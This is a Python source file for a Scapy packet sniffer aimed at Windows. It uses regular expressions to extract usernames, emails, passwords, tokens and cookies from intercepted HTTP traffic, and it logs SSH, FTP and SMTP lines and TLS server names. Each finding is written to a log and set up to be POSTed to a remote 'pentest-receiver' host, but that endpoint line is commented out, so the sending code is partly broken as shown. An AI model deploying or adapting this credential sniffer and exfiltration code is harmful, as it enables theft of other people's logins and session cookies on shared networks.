import ctypes
import json
import os
import sys
import time
from scapy.all import sniff
from datetime import datetime
import re
from urllib.parse import unquote_plus
from urllib.request import Request, urlopen

MUTEX_NAME = "Global\\NetworkSnifferMutex"

def already_running(): 
    kernel32 = ctypes.windll.kernel32
    mutex = kernel32.CreateMutexW(None, False, MUTEX_NAME)
    last_error = kernel32.GetLastError()
    if last_error == 183:  # ERROR_ALREADY_EXISTS
        kernel32.CloseHandle(mutex)
        return True
    global mutex_handle
    mutex_handle = mutex
    return False


LOG_FILE = "sniffer.log"
DEDUP_WINDOW_SECONDS = 0.35
_RECENT_LOGS = {}
# JSON_ENDPOINT = "https://pentest-receiver-production.up.railway.app/packets/data" #this probably does not work

FORM_FIELD_RE = re.compile(r"(?:^|[?&;\s])(?P<key>username|email|password|pass|pwd|token|login)=(?P<value>[^&\s]+)", re.IGNORECASE)
JSON_FIELD_RE = re.compile(r'"(?P<key>username|email|password|pass|pwd|token|login)"\s*:\s*"(?P<value>[^"]+)"', re.IGNORECASE)
COOKIE_RE = re.compile(r"Cookie:\s*(?P<cookie>.+)", re.IGNORECASE)
MEDIA_EXTENSIONS = (
    ".jpg", ".jpeg", ".png", ".gif", ".webp", ".svg",
    ".mp4", ".webm", ".mov", ".avi", ".pdf", ".mp3", ".wav",
)


def log_line(line):
    print(line)
    with open(LOG_FILE, "a") as f:
        f.write(line + "\n")


def parse_finding_data(finding):
    data = {}
    event_tokens = []

    for token in finding.split():
        if "=" in token:
            key, value = token.split("=", 1)
            if value.isdigit():
                data[key] = int(value)
                continue
            data[key] = value
            continue
        event_tokens.append(token)

    if event_tokens:
        data["event"] = " ".join(event_tokens)

    return data


def build_event_json(timestamp, protocol, finding):
    return {
        "date": timestamp,
        "protocol": protocol,
        "data": parse_finding_data(finding),
    }


def send_event_json(event):
    if not JSON_ENDPOINT:
        return

    try:
        payload = json.dumps(event).encode("utf-8")
        request = Request(
            JSON_ENDPOINT,
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urlopen(request, timeout=2):
            pass
    except Exception:
        return


def _is_duplicate_event(protocol, finding):
    now = time.time()
    cutoff = now - DEDUP_WINDOW_SECONDS

    stale_keys = [k for k, seen in _RECENT_LOGS.items() if seen < cutoff]
    for key in stale_keys:
        del _RECENT_LOGS[key]

    key = (protocol, finding)
    last_seen = _RECENT_LOGS.get(key)
    _RECENT_LOGS[key] = now
    return last_seen is not None and (now - last_seen) <= DEDUP_WINDOW_SECONDS


def log_protocol(timestamp, protocol, finding, dedup=False):
    if dedup and _is_duplicate_event(protocol, finding):
        return

    event = build_event_json(timestamp, protocol, finding)
    log_line(f"[{timestamp}] {protocol}: {finding}")
    send_event_json(event)


def extract_sensitive_fields(http_text):
    matches = []

    request_line = http_text.split("\r\n", 1)[0]
    request_parts = request_line.split(" ", 2)
    if len(request_parts) >= 2 and request_parts[0] in {"GET", "POST", "PUT", "PATCH"}:
        target = request_parts[1]
        for match in FORM_FIELD_RE.finditer(target):
            matches.append((match.group("key"), unquote_plus(match.group("value"))))

    _, _, body = http_text.partition("\r\n\r\n")
    if body:
        for match in FORM_FIELD_RE.finditer(body):
            matches.append((match.group("key"), unquote_plus(match.group("value"))))
        for match in JSON_FIELD_RE.finditer(body):
            matches.append((match.group("key"), match.group("value")))

    cookie_match = COOKIE_RE.search(http_text)
    if cookie_match:
        matches.append(("cookie", cookie_match.group("cookie").strip()))

    return matches


def extract_metadata(http_text):
    metadata = {}
    lines = http_text.split("\r\n")
    if lines and lines[0]:
        metadata["request"] = lines[0]
        request_parts = lines[0].split(" ", 2)
        if len(request_parts) >= 2:
            metadata["path"] = request_parts[1]

    for line in lines[1:]:
        if line.lower().startswith("host:"):
            metadata["host"] = line.split(":", 1)[1].strip()
            break

    return metadata


def is_media_request(path):
    clean_path = path.split("?", 1)[0].lower()
    return clean_path.endswith(MEDIA_EXTENSIONS)


def process_ssh(packet, timestamp):
    ip = packet["IP"]
    tcp = packet["TCP"]
    if tcp.sport == 22:
        direction = "outbound"
    else:
        direction = "inbound"

    flags = tcp.sprintf("%TCP.flags%")
    finding = (
        f"connection {direction} src={ip.src}:{tcp.sport} "
        f"dst={ip.dst}:{tcp.dport} flags={flags}"
    )

    if packet.haslayer("Raw"):
        payload = bytes(packet["Raw"].load)
        finding += f" payload_len={len(payload)}"

        text = payload.decode("utf-8", errors="ignore").strip()
        if text.startswith("SSH-"):
            banner = text.splitlines()[0][:120]
            finding += f" banner={banner}"

    log_protocol(timestamp, "SSH", finding, dedup=True)


def process_udp(packet, timestamp):
    udp = packet["UDP"]
    log_protocol(timestamp, "UDP", f"sport={udp.sport} dport={udp.dport}")


def process_icmp(packet, timestamp):
    ip = packet["IP"]
    icmp = packet["ICMP"]
    icmp_type_names = {
        0: "echo_reply",
        3: "dest_unreachable",
        5: "redirect",
        8: "echo_request",
        11: "time_exceeded",
        12: "param_problem",
    }
    type_name = icmp_type_names.get(int(icmp.type), "other")

    finding = (
        f"{type_name} type={icmp.type} code={icmp.code} "
        f"src={ip.src} dst={ip.dst} ttl={ip.ttl}"
    )

    # Echo request/reply usually includes id/sequence useful to correlate pings.
    if int(icmp.type) in {0, 8}:
        ident = getattr(icmp, "id", None)
        seq = getattr(icmp, "seq", None)
        finding += f" id={ident} seq={seq}"

    if packet.haslayer("Raw"):
        finding += f" payload_len={len(packet['Raw'].load)}"

    log_protocol(timestamp, "ICMP", finding, dedup=True)

def process_arp(packet, timestamp):
    arp = packet["ARP"]
    log_protocol(timestamp, "ARP", f"op={arp.op} {arp.psrc} ({arp.hwsrc}) -> {arp.pdst} ({arp.hwdst})")


def extract_tls_sni(payload):
    # Minimal TLS ClientHello parser for SNI extension (0x0000).
    if len(payload) < 11 or payload[0] != 0x16:
        return None
    if payload[5] != 0x01:  # Handshake type: ClientHello
        return None

    try:
        pos = 43  # Record(5) + Handshake hdr(4) + version(2) + random(32)
        session_id_len = payload[pos]
        pos += 1 + session_id_len

        cipher_len = int.from_bytes(payload[pos:pos + 2], "big")
        pos += 2 + cipher_len

        compression_len = payload[pos]
        pos += 1 + compression_len

        ext_len = int.from_bytes(payload[pos:pos + 2], "big")
        pos += 2
        end = pos + ext_len

        while pos + 4 <= end and pos + 4 <= len(payload):
            ext_type = int.from_bytes(payload[pos:pos + 2], "big")
            ext_size = int.from_bytes(payload[pos + 2:pos + 4], "big")
            pos += 4
            ext_data = payload[pos:pos + ext_size]
            pos += ext_size

            if ext_type == 0x0000 and len(ext_data) >= 5:
                # Server Name extension format: list_len(2), name_type(1), name_len(2), name
                name_len = int.from_bytes(ext_data[3:5], "big")
                name = ext_data[5:5 + name_len]
                return name.decode("utf-8", errors="ignore")
    except Exception:
        return None

    return None


def process_https(packet, timestamp):
    if not packet.haslayer("Raw"):
        log_protocol(timestamp, "HTTPS", "encrypted payload")
        return

    payload = bytes(packet["Raw"].load)
    if len(payload) > 5 and payload[0] == 0x16 and payload[5] == 0x01:
        sni = extract_tls_sni(payload)
        if sni:
            log_protocol(timestamp, "HTTPS", f"tls_client_hello sni={sni}")
        else:
            log_protocol(timestamp, "HTTPS", "tls_client_hello")
    else:
        preview_len = min(len(payload), 96)
        preview_hex = payload[:preview_len].hex()
        suffix = "..." if len(payload) > preview_len else ""
        log_protocol(timestamp, "HTTPS", f"encrypted payload len={len(payload)} hex={preview_hex}{suffix}")


def process_smtp(packet, timestamp):
    if packet.haslayer("Raw"):
        data = packet["Raw"].load.decode("utf-8", errors="ignore").strip().splitlines()
        if data:
            first_line = data[0][:160]
            log_protocol(timestamp, "SMTP", first_line)
            return

    log_protocol(timestamp, "SMTP", "session traffic")


def process_ftp(packet, timestamp):
    if packet.haslayer("Raw"):
        data = packet["Raw"].load.decode("utf-8", errors="ignore").strip().splitlines()
        if data:
            first_line = data[0][:160]
            log_protocol(timestamp, "FTP", first_line)
            return

    log_protocol(timestamp, "FTP", "session traffic")


def process_http(packet, timestamp):
    payload = packet["Raw"].load
    decoded_data = payload.decode("utf-8", errors="ignore")
    metadata = extract_metadata(decoded_data)
    req = metadata.get("request", "")
    if req and not re.match(r"^(GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS)\s+", req):
        return

    if metadata.get("path") and is_media_request(metadata["path"]):
        return

    sensitive_fields = extract_sensitive_fields(decoded_data)

    if sensitive_fields:
        field_str = ", ".join(f"{k}={v}" for k, v in sensitive_fields)
        if req:
            log_protocol(timestamp, "HTTP", f"{req} {field_str}")
        else:
            log_protocol(timestamp, "HTTP", f"partial_payload {field_str}")


def packet_callback(packet):

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if packet.haslayer("ARP"):
        process_arp(packet, timestamp)
        return

    if not packet.haslayer("IP"):
        return

    if packet.haslayer("ICMP"):
        process_icmp(packet, timestamp)
        return

    if packet.haslayer("UDP"):
        process_udp(packet, timestamp)
        return

    if not packet.haslayer("TCP"):
        return

    tcp = packet["TCP"]
    sport = tcp.sport
    dport = tcp.dport

    if sport == 22 or dport == 22:
        process_ssh(packet, timestamp)
        return

    if sport in {21, 20} or dport in {21, 20}:
        process_ftp(packet, timestamp)
        return

    if sport in {25, 587, 465} or dport in {25, 587, 465}:
        process_smtp(packet, timestamp)
        return

    if sport == 443 or dport == 443:
        process_https(packet, timestamp)
        return

    if packet.haslayer("Raw"):
        process_http(packet, timestamp)

def main():
    iface = None # None on Windows to use default interface, "lo" for Linux loopback testing
    bpf_filter = "tcp or udp or icmp or arp"
    print(f"[*] Scapy sniffer started on iface={iface or 'default'} filter='{bpf_filter}'. Press Ctrl+C to stop.")
    sniff(iface=iface, filter=bpf_filter, prn=packet_callback, store=False)

if __name__ == "__main__": 
    # uncomment the following lines on Windows
    if already_running():
        print("Another instance of the sniffer is already running. Exiting.")
        sys.exit(0)
    try:
        main()
    finally:
        if 'mutex_handle' in globals():
            ctypes.windll.kernel32.CloseHandle(mutex_handle)
        pass